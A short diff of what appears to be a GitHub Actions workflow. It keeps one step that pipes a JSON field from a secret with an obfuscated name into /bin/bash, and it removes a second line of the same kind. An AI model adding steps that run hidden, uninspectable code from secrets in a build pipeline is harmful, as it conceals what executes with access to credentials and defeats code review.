@@ -17,7 +17,6 @@ jobs:
           xrdu502: ${{ secrets.xrdu502 }}
         run: |
           printf '%s' "$xrdu502" | jq -r .rctz2 | /bin/bash
-          printf '%s' "$rq3" | jq -r .c011 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
